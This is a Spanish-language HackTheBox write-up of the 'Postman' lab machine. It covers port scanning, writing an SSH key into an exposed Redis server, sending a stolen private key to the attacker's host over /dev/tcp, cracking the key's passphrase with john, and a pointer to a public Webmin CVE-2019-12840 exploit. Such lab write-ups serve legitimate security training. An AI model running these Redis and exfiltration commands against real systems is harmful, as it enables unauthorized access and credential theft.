---
title: HackTheBox - Postman
author: cotes
date: 2023-09-12 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Redis Exploitation', 'RCE Webmin (CVE-2019-12840)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Postman/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Postman Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Redis Exploitation, RCE Webmin (CVE-2019-12840)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Postman/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Postman/02-versions.png)

c. Empezaremos investigando alguna posible vulnerabilidad de **redis**, ya que la página web no tiene información relevante y poseemos credenciales para el servicio de **Webmin**

* Pentesting [Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

Como si nos podemos conectar al servicio de redis, veremos si somos capaces de agregar una clave id_rsa pública, con el fin, de conectarnos por SSH

```bash
❯ pwd
/root/.ssh
❯ ssh-keygen -t rsa
❯ cat spaced_key.txt | redis-cli -h <IP Postman> -x set ssh_key
❯ redis-cli -h <IP Postman>
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
```

> Si tenemos algún error al ejecutar alguno de los comandos anteriores, debemos **reiniciar la máquina**
{: .prompt-info }

d. Ahora, ya seremos capaces de conectarnos al servicio **SSH** y empezar a enumerar el sistema para escalar privilegios

### Escalada de Privilegios 💹

a. Encontramos una clave **id_rsa** en el directorio opt, la cuál transferimos a nuestra máquina

```bash
redis@Postman:/opt$ cat < id_rsa.bak > /dev/tcp/10.10.14.18/4444
-----------------------------------------------------------------
❯ nc -lvnp 4444 > id_rsa
```

Esta clave está protegida con contraseña, así que extraeremos el hash con **ssh2john** para crackearlo

```bash
❯ ssh2john id_rsa > hash
❯ john hash -w=/usr/share/wordlists/rockyou.txt
id_rsa:computer2008
```

b. La contraseña obtenida es del usuario **Matt** y también sirve para conectarse al servicio Webmin

* Al convertirnos en **Matt** veremos que el propietario del proceso de webmin es **root**, además de ver la versión al momento de autenticarnos en Webmin

    ```bash
    Matt@Postman:/opt$ ps -faux | grep -i webmin
    <SNIP>
    root        723  0.0  3.1  95296 29256 ?        Ss   14:28   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
    ```

    ![](/assets/images/HTB/Easy/Postman/03-version.png)

Al buscar un exploit para esta versión de Webmin llegamos a [CVE-2019-12840](https://github.com/roughiz/Webmin-1.910-Exploit-Script)

c. Nos ponemos en escucha con **nc** y ejecutamos el script

![](/assets/images/HTB/Easy/Postman/04-exploit.png)
